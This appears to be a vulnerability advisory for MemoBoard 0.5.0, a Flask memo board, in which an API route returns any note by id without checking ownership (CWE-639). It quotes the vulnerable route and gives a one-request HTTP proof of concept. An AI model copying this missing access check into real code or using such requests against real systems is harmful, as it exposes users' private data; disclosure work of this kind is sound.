descriptions.description: CWE-639 Authorization Bypass Through User-Controlled Key

descriptions.value:
MemoBoard (pip package memoboard) version 0.5.0 is a Flask intranet memo board.
It is affected by insecure direct object reference (CWE-639) because src/app.py api_note() reads the X-User header but never checks note ownership, skipping the intended author-only read control.
Attack chain: an unauthenticated GET to /api/notes/<id> (source: note_id path parameter; X-User is unused) reaches the sink get_note() in src/board/store.py which SELECTs by id only and returns the full row on the default deployment.
Vulnerable code in src/app.py:
@app.get("/api/notes/<int:note_id>")
def api_note(note_id: int):
    """Fetch one memo. X-User is the logged-in identity.

    Intended rule: only the author may read their own note.
    Bug: ownership is never checked — any id is returned (IDOR).
    """
    _current = (request.headers.get("X-User") or "").strip()
    row = get_note(note_id)
    if not row:
        abort(404)
    return jsonify(row)
HTTP PoC:
GET /api/notes/2 HTTP/1.1
Host: TARGET:5000
X-User: alice
Accept: application/json
Connection: close
Impact: a remote unauthenticated attacker can enumerate note ids and read other users' private memos, including confidential salary text in seed data. Remaining control: none; the unused X-User header is not an access check.
